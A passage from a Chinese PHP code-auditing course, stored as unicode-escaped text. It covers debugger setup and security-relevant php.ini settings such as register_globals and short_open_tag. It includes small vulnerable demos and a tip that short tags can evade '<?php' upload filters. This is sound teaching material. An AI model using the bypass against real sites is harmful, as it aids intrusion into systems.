l \u586B\u5199IDE\u4E2D\u4EE3\u7801\u6587\u4EF6\u8DEF\u5F84\u4E0E\u670D\u52A1\u5668\u4E2D\u4EE3\u7801\u6587\u4EF6\u8DEF\u5F84\uFF08\u4E24\u4E2A\u6587\u4EF6\u8DEF\u5F84\u53CA\u6587\u4EF6\u4E2D\u4EE3\u7801\u5185\u5BB9\u5FC5\u987B\u5B8C\u5168\u5BF9\u5E94\u624D\u80FD\u591F\u8C03\u8BD5\u6B63\u5E38\uFF0C\u5426\u5219\u4F1A\u51FA\u73B0\u65E0\u6CD5\u8C03\u8BD5\u6216\u4EE3\u7801\u8C03\u8BD5\u4E0D\u540C\u6B65\u95EE\u9898\uFF09\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image116.jpg)\r
\r
\u56FE1-56 \u8C03\u8BD5\u670D\u52A1\u5668\u914D\u7F6E\u56FE\r
\r
5\u3001\u914D\u7F6E\u8C03\u8BD5\u5668\r
\r
\u70B9\u51FBRun->Edit Configurations->\u201C+\u201D->PHP Remote Debug\u6DFB\u52A0\u8C03\u8BD5\u914D\u7F6E\u3002\u8C03\u8BD5\u5668\u4E2DServer\u5E94\u4E0E\u4E0A\u8FF0\u521B\u5EFAServer\u540D\u79F0\u5339\u914D\uFF0CIDE key\u5E94\u4E0Ephp.ini\u6587\u4EF6\u4E2DIDE Key\u5339\u914D\uFF0C\u5982\u56FE1-57\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image118.jpg)\r
\r
\u56FE1-57 \u8C03\u8BD5\u914D\u7F6E\u56FE\r
\r
6\u3001\u8C03\u8BD5\u65B9\u6CD5\u4ECB\u7ECD\u4E0E\u6D4B\u8BD5\r
\r
  \u56FE1-58\u4E3APHP\uFF0C\u5206\u4E3A\u4E09\u4E2A\u90E8\u5206\uFF1A\u8C03\u8BD5\u5668\u3001\u65AD\u70B9\u533A\u57DF\u3001PHP\u4EE3\u7801\u3002\r
\r
l \u65AD\u70B9\u533A\u57DF\uFF1A\u53EF\u5728\u9884\u8C03\u8BD5\u4EE3\u7801\u5DE6\u4FA7\u70B9\u51FB\u7A7A\u767D\u533A\u57DF\u4E3A\u4EE3\u7801\u6253\u65AD\u70B9\uFF1B\r
\r
l \u8C03\u8BD5\u5668\uFF08\u65AD\u5F00\u6216\u8FDE\u63A5\u8C03\u8BD5\uFF09\uFF1A\u8C03\u8BD5\u524D\u5E94\u70B9\u51FB\u8C03\u8BD5\u8FDE\u63A5\u6309\u94AE\u6253\u5F00\u8C03\u8BD5\u5668\u8FDE\u63A5\uFF1B\r
\r
l \u5F00\u542F\u8C03\u8BD5\uFF1A\u70B9\u51FB\u201C\u6606\u866B\u201D\u56FE\u6807\u6253\u5F00\u8C03\u8BD5\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image120.jpg)\r
\r
\u56FE1-58 \u8C03\u8BD5\u65B9\u6CD5\u56FE\r
\r
\u5BF9\u914D\u7F6E\u597D\u7684\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u8FDB\u884C\u6D4B\u8BD5\u3002\u9996\u5148\u521B\u5EFA\u5185\u5BB9\u4E3A<?php phpinfo();?>\u76841.php\u6587\u4EF6\uFF0C\u5E76\u4E8Ephpinfo();\u5904\u8BBE\u7F6E\u65AD\u70B9\uFF0C\u5F53\u4F7F\u7528\u6D4F\u89C8\u5668\u8BBF\u95EE\u8BE5\u9875\u9762\u4EE3\u7801\u65F6\uFF0C\u4EE3\u7801\u622A\u65AD\u5982\u56FE1-59\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image122.jpg)\r
\r
\u56FE1-59 \u8C03\u8BD5\u65AD\u70B9\u56FE\r
\r
\u56FE1-60\u4E3A\u52A8\u6001\u8C03\u8BD5\u6D41\u7A0B\uFF0C\u9996\u5148\u914D\u7F6EPhpStorm\u8C03\u8BD5\u73AF\u5883\uFF0C\u5E76\u4E3A\u6307\u5B9A\u4EE3\u7801\u8BBE\u7F6E\u65AD\u70B9\uFF0C\u5F00\u542FPhpStorm\u4E2D\u7684\u8C03\u8BD5\u5668\u3002\u7136\u540E\u4F7F\u7528\u6D4F\u89C8\u5668\u7684Debug\u6A21\u5F0F\u8BBF\u95EE\u6307\u5B9A\u9875\u9762\u89E6\u53D1\u8BF7\u6C42\uFF0C\u6700\u540E\u67E5\u770B\u65AD\u70B9\u5904\u4EE3\u7801\u662F\u5426\u62E6\u622A\u5E76\u8FDB\u884C\u5206\u6790\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image124.jpg)\r
\r
\u56FE1-60 \u8C03\u8BD5\u6D41\u7A0B\u56FE\r
\r
## 1.8 \u5355\u5143\u5C0F\u7ED3\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u662F\u5B89\u5168\u5B66\u4E60\u9636\u6BB5\u9AD8\u9636\u5185\u5BB9\uFF0C\u8BE5\u90E8\u5206\u4E5F\u662F\u5B89\u5168\u884C\u4E1A\u8981\u6C42\u5177\u5907\u7684\u6280\u80FD\u3002\u672C\u5355\u5143\u4E3B\u8981\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u7684\u57FA\u7840\u77E5\u8BC6\u3002\u7ECF\u8FC7\u672C\u5355\u5143\u7684\u5B66\u4E60\uFF0C\u8BFB\u8005\u9700\u4E86\u89E3\u4EE3\u7801\u5BA1\u8BA1\u7684\u57FA\u672C\u542B\u4E49\u3001\u4E86\u89E3\u4EE3\u7801\u5BA1\u8BA1\u6D41\u7A0B\u3001\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u7684\u4F7F\u7528\u65B9\u6CD5\u3002\u540C\u65F6\u672C\u5355\u5143\u8BBE\u8BA1\u4E86\u5B9E\u9A8C\uFF1AWindows\u4E0ELinux\u642D\u5EFA74CMS\u3002\u901A\u8FC7\u672C\u5355\u5143\u7684\u5B66\u4E60\u5BF9\u4EE3\u7801\u5BA1\u8BA1\u73AF\u5883\u642D\u5EFA\u3001\u57FA\u672C\u65B9\u6CD5\u4E0E\u6D41\u7A0B\u6709\u4E00\u5B9A\u7406\u89E3\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u51432 \u4EE3\u7801\u5BA1\u8BA1\u524D\u5BFC\r
\r
**\u5355\u5143\u6982\u8FF0\uFF1A**\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u7684\u524D\u5BFC\u77E5\u8BC6\uFF0C\u5206\u4E3A\u56DB\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECD\u4E86\u5F71\u54CD\u4EE3\u7801\u5BA1\u8BA1\u7ED3\u679C\u7684\u5E38\u89C1PHP\u6838\u5FC3\u5B89\u5168\u914D\u7F6E\uFF0C\u4ECE\u800C\u4E3A\u4EE5\u540E\u5B66\u4E60\u5404\u79CD\u5B89\u5168\u6F0F\u6D1E\u5BA1\u8BA1\u5960\u5B9A\u57FA\u7840\uFF0C\u4F8B\u5982\uFF1A\u5BBD\u5B57\u8282\u6CE8\u5165\uFF0C\u6587\u4EF6\u5305\u542B\uFF0C\u4EE3\u7801\u6267\u884C\u7B49\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECD\u4EE3\u7801\u5BA1\u8BA1\u57FA\u672C\u51FD\u6570\u53CA\u5F31\u7C7B\u578B\u5B89\u5168\u95EE\u9898\uFF0C\u5305\u62EC\uFF1ACMS\u5BA1\u8BA1\u5E38\u7528\u7684\u8C03\u8BD5\u51FD\u6570\u3001\u5173\u6CE8\u7684\u6F0F\u6D1E\u70B9\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECD\u5E38\u89C1Web\u5B89\u5168\u6F0F\u6D1E\u7684\u5371\u9669\u51FD\u6570\uFF0C\u4ECE\u800C\u5BF9\u540E\u7EED\u5B89\u5168\u5BA1\u8BA1\u5960\u5B9A\u57FA\u7840\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4ECB\u7ECD\u4E86\u5E38\u89C1\u7684\u4EE3\u7801\u5BA1\u8BA1\u4E09\u79CD\u65B9\u6CD5\uFF1A\u901A\u8BFB\u5168\u6587\u6CD5\u3001\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u3001\u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\u3002\u4F7F\u7528\u4E0D\u540C\u5BA1\u8BA1\u65B9\u6CD5\u5BF9CMS\u7CFB\u7EDF\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u4F7F\u8BFB\u8005\u7406\u89E3\u4E0D\u540C\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\u7684\u6D41\u7A0B\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image126.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u4E86\u89E3\u5F71\u54CD\u4EE3\u7801\u5BA1\u8BA1\u7684\u5E38\u89C1\u914D\u7F6E\u9009\u9879\uFF1B\r
\r
\\2.  \u4E86\u89E3\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u57FA\u672C\u51FD\u6570\uFF1B\r
\r
\\3.  \u719F\u6089\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u5404\u79CD\u5B89\u5168\u6F0F\u6D1E\u7684\u5371\u9669\u51FD\u6570\uFF1B\r
\r
\\4.  \u638C\u63E1\u4E09\u79CD\u5E38\u89C1\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
## 2.1 \u5F71\u54CD\u4EE3\u7801\u5BA1\u8BA1\u7684\u914D\u7F6E\r
\r
\u5728\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u4E4B\u524D\u9700\u8981\u5BF9PHP\u6838\u5FC3\u914D\u7F6E\u6587\u4EF6\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u8FD9\u662F\u56E0\u4E3A\u5F88\u591A\u7684\u5B89\u5168\u6F0F\u6D1E\u5F80\u5F80\u4F1A\u6839\u636E\u4EE3\u7801\u7684\u914D\u7F6E\u73AF\u5883\u4E0D\u540C\u5BFC\u81F4\u5176\u6267\u884C\u7ED3\u679C\u5B58\u5728\u5F88\u5927\u7684\u5DEE\u5F02\u3002\u5728\u5F88\u591A\u65F6\u5019\u6211\u4EEC\u901A\u8FC7\u4EE3\u7801\u5BA1\u8BA1\u53D1\u73B0\u4E86\u4E00\u4E2A\u975E\u5E38\u9AD8\u5371\u7684\u6F0F\u6D1E\uFF0C\u4F46\u662F\u7531\u4E8E\u5176\u914D\u7F6E\u95EE\u9898\u5BFC\u81F4\u6784\u9020\u7684payload\u65E0\u6CD5\u6B63\u5E38\u6267\u884C\u3002\r
\r
\u867D\u7136\u968F\u7740PHP\u7248\u672C\u7684\u66F4\u65B0\u5F88\u591A\u7684\u4E0D\u5B89\u5168\u914D\u7F6E\u53C2\u6570\u5DF2\u7ECF\u5E9F\u5F03\uFF0C\u4F46\u662F\u719F\u6089PHP\u5404\u7248\u672C\u4E2D\u7684\u914D\u7F6E\u6587\u4EF6\u53C2\u6570\u4F9D\u65E7\u662F\u719F\u7EC3\u638C\u63E1\u4EE3\u7801\u5BA1\u8BA1\u7684\u5FC5\u5907\u57FA\u7840\u77E5\u8BC6\u3002\u56E0\u6B64\uFF0C\u672C\u8282\u5C06\u5BF9\u5F71\u54CD\u4EE3\u7801\u5BA1\u8BA1\u7ED3\u679C\u7684\u6838\u5FC3PHP\u914D\u7F6E\u53C2\u6570\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
### 2.1.1 PHP\u7684\u914D\u7F6E\u6587\u4EF6\r
\r
\uFF081\uFF09php.ini\u6587\u4EF6\r
\r
php.ini\u662FPHP\u7684\u4E00\u4E2A\u5168\u5C40\u914D\u7F6E\u6587\u4EF6\uFF0C\u5BF9\u6574\u4E2AWeb\u670D\u52A1\u8D77\u4F5C\u7528\u3002\u8BE5\u6587\u4EF6\u5C06\u5728PHP\u542F\u52A8\u65F6\u88AB\u8BFB\u53D6\uFF0CPHP\u7684\u8FD0\u884C\u6A21\u5F0F\u5B58\u5728\u56DB\u79CD\uFF1ACGI\uFF08\u901A\u7528\u7F51\u5173\u63A5\u53E3\u6A21\u5F0F\uFF09\u3001CLI\uFF08\u547D\u4EE4\u884C\u8FD0\u884C\u6A21\u5F0F\uFF09\u3001Web\u6A21\u5757\u6A21\u5F0F\uFF08apache\u7B49Web\u670D\u52A1\u5668\u8FD0\u884C\u7684\u6A21\u5757\u6A21\u5F0F\uFF09\u3001FASTCGI\uFF08\u5E38\u9A7B\u578B\u7684CGI\u6A21\u5F0F\uFF09\u3002\u5BF9\u4E8EWeb\u6A21\u5757\u6A21\u5F0F\u7684PHP\u800C\u8A00\uFF0Cphp.ini\u4EC5\u5728Web\u670D\u52A1\u5668\u542F\u52A8\u65F6\u8BFB\u53D6\u4E00\u6B21\u3002\u5BF9\u4E8ECGI\u548CCLI\u7248\u672C\u7684PHP\u800C\u8A00\uFF0Cphp.ini\u6BCF\u6B21\u8C03\u7528\u90FD\u4F1A\u88AB\u8BFB\u53D6\u3002Apache Web\u670D\u52A1\u5668\u5728\u542F\u52A8\u65F6\u4F1A\u628A\u76EE\u5F55\u8F6C\u5230\u6839\u76EE\u5F55\u4E2D\uFF0C\u8FD9\u5C06\u5BFC\u81F4PHP\u5C1D\u8BD5\u5728\u6839\u76EE\u5F55\u4E0B\u8BFB\u53D6php.ini\u6587\u4EF6\u3002\r
\r
\uFF082\uFF09user.ini\u6587\u4EF6\r
\r
user.ini\u548C.htaccess\u4E00\u6837\u662F\u76EE\u5F55\u7684\u914D\u7F6E\u6587\u4EF6\uFF0Cuser.ini\u5C31\u662F\u7528\u6237\u81EA\u5B9A\u4E49\u7684\u4E00\u4E2Aphp.ini\u3002\u81EAPHP 5.3.0\u7248\u672C\u5F00\u59CB\uFF0CPHP\u652F\u6301\u57FA\u4E8E\u6BCF\u4E2A\u76EE\u5F55\u7684.htaccess\u98CE\u683C\u7684INI\u6587\u4EF6\uFF0C\u6B64\u7C7B\u6587\u4EF6\u4EC5\u88ABCGI/FASTCGI\u5904\u7406\u3002\u8BE5\u6587\u4EF6\u7531PHP\u52A0\u8F7D\uFF0C\u5176\u914D\u7F6E\u9879\u5C31\u662FPHP\u7684\u914D\u7F6E\u9879\uFF0C\u4F46\u8BE5\u6587\u4EF6\u53EF\u4EE5\u653E\u5230\u6BCF\u4E2A\u7F51\u7AD9\u7684\u6839\u76EE\u5F55\u4ECE\u800C\u4E3A\u6BCF\u4E2A\u7F51\u7AD9\u5B9A\u5236\u81EA\u5DF1\u5355\u72EC\u7684\u914D\u7F6E\u6587\u4EF6\u3002\r
\r
\uFF083\uFF09PHP\u7684\u914D\u7F6E\u8BED\u6CD5\r
\r
PHP\u914D\u7F6E\u6587\u4EF6\u8BED\u6CD5\u683C\u5F0F\u4E3A\uFF1A\r
\r
\r
\r
\u6307\u4EE4\u540D\uFF08directive\uFF09 = \u503C\uFF08value\uFF09\r
\r
\r
\r
\u5176\u6307\u4EE4\u540D\u5B58\u5728\u5927\u5C0F\u5199\u654F\u611F\u7279\u6027\uFF0C\u4F8B\u5982\uFF1Afoo=bar\u4E0EFOO=bar\u662F\u4E0D\u540C\u7684\u3002\u5176\u503C\u53EF\u4EE5\u662F\uFF1A\r
\r
l \u7528\u5F15\u53F7\u754C\u5B9A\u7684\u5B57\u7B26\u4E32\uFF0C\u4F8B\u5982\u201Cfoo\u201D\uFF1B\r
\r
l \u4E00\u4E2A\u6570\u5B57\uFF0C\u4F8B\u5982\uFF1A0\uFF0C1\uFF0C34\uFF0C-1\uFF1B\r
\r
l \u4E00\u4E2APHP\u5E38\u4EAE\uFF1A\u4F8B\u5982\uFF1AE_ALL\u3001M_Pi\uFF1B\r
\r
l \u4E00\u4E2AINI\u5E38\u91CF\uFF0C\u4F8B\u5982\uFF1AON\u3001OFF\u3001none\uFF1B\r
\r
l \u4E00\u4E2A\u8868\u8FBE\u5F0F\uFF0C\u4F8B\u5982\uFF1AE_ALL&~E_NOTICE\u3002\r
\r
### 2.1.2 \u4F20\u9012\u53D8\u91CF\u76F8\u5173\u7684PHP\u914D\u7F6E\r
\r
1\u3001\u5168\u5C40\u53D8\u91CF\u6CE8\u518C\u5F00\u5173\uFF08register_globals\uFF09\r
\r
\u8BE5\u914D\u7F6E\u5728\u5F00\u542F\u60C5\u51B5\u4E0B\uFF0CPHP\u4F1A\u5C06HTTP\u7684$_POST\u3001$_GET\u3001$_COOKIE\u3001$_ENV\u3001$_SESSION\u6570\u7EC4\u4E2D\u7684$key=>$value\u76F4\u63A5\u6CE8\u518C\u4E3A\u53D8\u91CF\u3002\u8BE5\u65B9\u6CD5\u5C06\u4E0A\u8FF0\u65B9\u6CD5\u7684\u4F20\u9012\u53C2\u6570\u81EA\u52A8\u6CE8\u518C\u4E3A\u7A0B\u5E8F\u4E2D\u7684\u5168\u5C40\u53D8\u91CF\u5E76\u521D\u59CB\u5316\u4E3A\u8BE5\u53C2\u6570\u4F20\u9012\u5BF9\u5E94\u7684\u503C\uFF0C\u4F7F\u8FD9\u4E9B\u53C2\u6570\u53EF\u4EE5\u76F4\u63A5\u5728PHP\u811A\u672C\u4E2D\u4F7F\u7528\u3002\u4F8B\u5982\uFF1A$_POST['passwd']\u4F1A\u88AB\u6CE8\u518C\u4E3A\u53D8\u91CF$passwd\u3002\r
\r
\u8BE5\u914D\u7F6E\u7684\u5F00\u542F\u867D\u7136\u65B9\u4FBF\u4E86\u7A0B\u5E8F\u8C03\u7528\u53C2\u6570\uFF0C\u4F46\u662F\u4E5F\u5C06\u9020\u6210\u5F88\u4E25\u91CD\u7684\u5B89\u5168\u95EE\u9898\uFF1A\r
\r
l \u7531\u4E8E\u5168\u5C40\u53D8\u91CF\u65E0\u6CD5\u770B\u5230\u53D8\u91CF\u4ECE\u54EA\u83B7\u53D6\uFF0C\u4ECE\u800C\u4E0D\u5229\u4E8E\u4EE3\u7801\u7684\u9605\u8BFB\uFF1B\r
\r
l \u53D8\u91CF\u4E4B\u95F4\u4F1A\u76F8\u4E92\u8986\u76D6\uFF0C\u5F15\u8D77\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\uFF1B\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6D4B\u8BD5\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
if($user=='test'){\r
\r
  echo 'true';}\r
\r
?>\r
\r
\r
\r
  \u6267\u884C\u7ED3\u679C\u5982\u56FE2-1\u6240\u793A\uFF0C\u4F7F\u7528HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012user\u53C2\u6570\u81EA\u52A8\u521D\u59CB\u5316\u503C\u4E3Atest\uFF0C\u4E14\u901A\u8FC7\u6BD4\u8F83\u8FD4\u56DEtrue\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image128.jpg)\r
\r
\u56FE2-1 register_globals\u914D\u7F6E\u6D4B\u8BD5\u56FE\r
\r
2\u3001\u77ED\u6807\u7B7E\u5F00\u5173\uFF08short_open_tag\uFF09\r
\r
\u8BE5\u914D\u7F6E\u5728\u5F00\u542F\u60C5\u51B5\u4E0B\uFF0CPHP\u5C06\u5141\u8BB8\u4F7F\u7528\u6807\u5FD7\u7684\u7F29\u5199\u5F62\u5F0F\u201C<? xxx?>\u201D\u3002\u5982\u679C\u8BE5\u914D\u7F6E\u5173\u95ED\uFF0C\u5219\u9700\u4F7F\u7528PHP\u4EE3\u7801\u7684\u5B8C\u6210\u5F62\u5F0F\u201C<?php xxx?>\u201D\u3002\u540C\u65F6\uFF0C\u8BE5\u914D\u7F6E\u8FD8\u4F1A\u5F71\u54CD\u5230\u201C<?echo $a ?>\u201D\u5F62\u5F0F\u7684\u4EE3\u7801\uFF0C\u5C06\u5176\u7F29\u5199\u5F62\u5F0F\u4E3A\u201C<?=$a ?>\u201D\u3002\r
\r
\u67D0\u4E9B\u7F51\u7AD9\u7684\u8FC7\u6EE4\u51FD\u6570\u4F1A\u5BF9\u654F\u611F\u5B57\u7B26\u201C<?php\u201D\u8FDB\u884C\u68C0\u67E5\uFF0C\u82E5\u8BE5\u914D\u7F6E\u5F00\u542F\uFF0C\u5219\u53EF\u4EE5\u5B9E\u73B0\u4F7F\u7528\u7F29\u5199\u5F62\u5F0F\u4E0A\u4F20\u654F\u611F\u5185\u5BB9\uFF0C\u7ED5\u8FC7\u654F\u611F\u5B57\u7B26\u68C0\u67E5\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6D4B\u8BD5\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php $user='test';?>\r
\r
<?=$user?>\r
\r
\r
\r
\u6267\u884C\u7ED3\u679C\u5982\u56FE2-2\u6240\u793A\uFF0C\u4EE3\u7801\u201C<?=$user?>\u201D\u662F\u201C<?php echo $user?>\u201D\u7684\u7F29\u5199\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image130.jpg)\r
\r
\u56FE1-28 register_globals\u914D\u7F6E\u6D4B\u8BD5\u56FE\r
\r
### 2.1.3 \u5B89\u5168\u6A21\u5F0F\r
\r
safe_mode\uFF08\u5B89\u5168\u6A21\u5F0F\uFF09\u914D\u7F6E\u662FPHP\u5185\u7F6E\u7684\u4E00\u79CD\u5B89\u5168\u673A\u5236\uFF0C\u8BE5\u5B89\u5168\u673A\u5236\u53EF\u4EE5\u6709\u6548\u7684\u9632\u6B62\u6587\u4EF6\u64CD\u4F5C\u51FD\u6570\u4E0E\u547D\u4EE4\u6267\u884C\u51FD\u6570\u7684\u6267\u884C\u3002\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0Cphp.ini\u6587\u4EF6\u5E76\u6CA1\u6709\u5F00\u542F\u5B89\u5168\u6A21\u5F0F\uFF08\u5373php.ini\u914D\u7F6E\u6587\u4EF6\u4E2Dsafe_mode = off\uFF09\uFF0C\u4E14\u8BE5\u7279\u6027\u81EAPHP5.4.0\u7248\u672C\u5DF2\u7ECF\u88AB\u79FB\u9664\u3002\r
\r
1\u3001\u5B89\u5168\u6A21\u5F0F\u4E0B\u53EF\u9632\u5FA1\u51FD\u6570\r
\r
l \u6587\u4EF6\u64CD\u4F5C\u51FD\u6570\r
\r
safe_mode\u914D\u7F6E\u5F00\u542F\u540E\uFF0C\u51FD\u6570unlink\u3001file\u3001include\u4F7F\u7528\u65F6\u5C06\u4F1A\u53D7\u9650\u3002\u4F8B\u5982\uFF1A\u82E5\u516C\u7528\u6587\u4EF6\u653E\u7F6E\u4E8E\u975EWeb\u670D\u52A1\u76EE\u5F55\u4E0B\uFF0C\u5219include\u51FD\u6570\u5C06\u65E0\u6CD5\u6B63\u5E38\u52A0\u8F7D\u516C\u7528\u6587\u4EF6\u3002\u9700\u4F7F\u7528safe_mode_include_dir\u6307\u4EE4\u914D\u7F6E\u53EF\u52A0\u8F7D\u76EE\u5F55\uFF0C\u4ECE\u800C\u63D0\u5347\u5B89\u5168\u6027\uFF0C\u6709\u6548\u9632\u6B62\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u3002\r
\r
l \u547D\u4EE4\u6267\u884C\u51FD\u6570\r
\r
safe_mode\u914D\u7F6E\u5F00\u542F\u540E\uFF0C\u51FD\u6570system\u3001exec\u3001popen\u3001shell_exec\u7B49\u88AB\u4F7F\u7528\u65F6\u5C06\u4F1A\u53D7\u9650\u3002\u4F8B\u5982\uFF1A\u4F7F\u7528exec\u51FD\u6570\u6267\u884C\u7CFB\u7EDF\u6307\u4EE4\u65F6\uFF0C\u5C06\u63D0\u793A\u51FD\u6570\u6267\u884C\u9519\u8BEF\u3002\u9700\u4F7F\u7528safe_exec_dir\u6307\u4EE4\u914D\u7F6E\u811A\u672C\u6267\u884C\u76EE\u5F55\uFF0C\u4ECE\u800C\u63D0\u5347\u5B89\u5168\u6027\uFF0C\u6709\u6548\u7684\u9632\u6B62\u547D\u4EE4\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
2\u3001\u5B89\u5168\u6A21\u5F0F\u4E0B\u6267\u884C\u7A0B\u5E8F\u4E3B\u76EE\u5F55\uFF08safe_mode_exec_dir\uFF09\r
\r
\u5982\u679CPHP\u4F7F\u7528\u4E86\u5B89\u5168\u6A21\u5F0F\uFF0C\u53EF\u901A\u8FC7\u5982\u4E0B\u65B9\u6CD5\u8FDB\u884C\u914D\u7F6E\uFF1A\r
\r
\r
\r
safe_mode_exec_dir = /var/www/html\r
\r
\r
\r
\u5176\u503C\u5FC5\u987B\u4F7F\u7528\u201C/\u201D\u4F5C\u4E3A\u76EE\u5F55\u5206\u9694\u7B26\uFF0C\u4E14\u53EA\u5141\u8BB8\u5728\u8BE5\u914D\u7F6E\u76EE\u5F55\u4E0B\u6267\u884C\u3002\u6B64\u914D\u7F6E\u5C06\u5BFC\u81F4system\u51FD\u6570\u548C\u5176\u4ED6\u7A0B\u5E8F\u6267\u884C\u51FD\u6570\u90FD\u88AB\u62D2\u7EDD\u542F\u52A8\u4E0D\u518D\u6B64\u76EE\u5F55\u4E2D\u7684\u7A0B\u5E8F\u3002\r
\r
3\u3001\u7981\u7528\u7C7B/\u51FD\u6570\uFF08disable_classes\u3001disable_functions\uFF09\r
\r
\u5728php.ini\u914D\u7F6E\u6587\u4EF6\u4E2D\uFF0C\u53EF\u4EE5\u4F7F\u7528\u201Cdisable_classes\u201D\u65B9\u6CD5\u7981\u7528\u7C7B\uFF0C\u4F7F\u7528\u201Cdisable_functions\u201D\u65B9\u6CD5\u7981\u7528\u51FD\u6570\u3002\u82E5\u5B58\u5728\u591A\u4E2A\u914D\u7F6E\u7684\u503C\u5219\u4F7F\u7528\u9017\u53F7\u8FDB\u884C\u5206\u9694\u4E14\u503C\u5FC5\u987B\u662F\u51FD\u6570\u540D\u79F0\u3002\u5176\u914D\u7F6E\u65B9\u6CD5\u5982\u4E0B\uFF1A\r
\r
\r
\r
disable_functions = opendir,readdir,scandir,fopen,unlink\r
\r
\r
\r
### 2.1.4 \u6587\u4EF6\u4E0A\u4F20\u53CA\u76EE\u5F55\u6743\u9650\u76F8\u5173\u914D\u7F6E\r
\r
1\u3001\u8BBE\u7F6E\u4E0A\u4F20\u53CA\u4E0A\u4F20\u6587\u4EF6\u5927\u5C0F\uFF08file_uploads\u3001upload_max_filesize\uFF09\r
\r
php.ini\u4E2D\u53C2\u6570file_uploads\u7528\u6765\u8BBE\u7F6EPHP\u662F\u5426\u5141\u8BB8\u6587\u4EF6\u4E0A\u4F20\uFF0C\u8BE5\u529F\u80FD\u9ED8\u8BA4\u60C5\u51B5\u4E0B\u5904\u4E8E\u5F00\u542F\u72B6\u6001\u3002\u53C2\u6570upload_max_filesize\u7528\u4E8E\u8BBE\u7F6EPHP\u6240\u652F\u6301\u7684\u6700\u5927\u6587\u4EF6\u5927\u5C0F\uFF0C\u9ED8\u8BA4\u60C5\u51B5\u4E0B\u4E3A2M\u3002\u5176\u914D\u7F6E\u5982\u4E0B\uFF1A\r
\r
\r
\r
file_uploads = On\r
\r
upload_max_filesize = 2M\r
\r
\r
\r
2\u3001\u6587\u4EF6\u4E0A\u4F20\u4E34\u65F6\u76EE\u5F55\uFF08upload_tmp_dir\uFF09\r
\r
php.ini\u4E2D\u53C2\u6570upload_tmp_dir\u7528\u6765\u8BBE\u7F6E\u4E0A\u4F20\u4E34\u65F6\u6587\u4EF6\u4FDD\u5B58\u7684\u76EE\u5F55\uFF0C\u8BE5\u529F\u80FD\u9ED8\u8BA4\u60C5\u51B5\u4E0B\u4E3A\u7A7A\uFF0C\u5176\u91C7\u7528\u7CFB\u7EDF\u4E34\u65F6\u76EE\u5F55\u3002Windows\u7CFB\u7EDF\u4E3AC:\\Windows\\Temp\uFF0CLinux\u7CFB\u7EDF\u4E3A/tmp\u3002\r
\r
3\u3001\u7528\u6237\u8BBF\u95EE\u76EE\u5F55\u9650\u5236\uFF08open_basedir\uFF09\r
\r
\u4F7F\u7528open_basedir\u53C2\u6570\u53EF\u4EE5\u63A7\u5236PHP\u811A\u672C\u80FD\u8BBF\u95EE\u7684\u76EE\u5F55\uFF0C\u8FD9\u6837\u80FD\u591F\u907F\u514DPHP\u811A\u672C\u8BBF\u95EE\u7981\u6B62\u8BBF\u95EE\u7684\u6587\u4EF6\uFF0C\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u9650\u5236Webshell\u7684\u5371\u5BB3\u3002\u4E00\u822C\u5C06\u8BE5\u53C2\u6570\u8BBE\u7F6E\u4E3A\u53EA\u80FD\u8BBF\u95EE\u7F51\u7AD9\u7684\u6839\u8DEF\u5F84\uFF08\u5373PHP\u6587\u4EF6\u6240\u5728\u7684\u76EE\u5F55\uFF09\u548C/tmp\u76EE\u5F55\uFF08\u591A\u4E2A\u76EE\u5F55\u9700\u8981\u4F7F\u7528\u5206\u53F7:\u8FDB\u884C\u5206\u9694\uFF09\uFF0C\u8FD9\u6837\u80FD\u591F\u6709\u6548\u7684\u9632\u6B62PHP\u6728\u9A6C\u8DE8\u7AD9\u8FD0\u884C\uFF0C\u5176\u914D\u7F6E\u59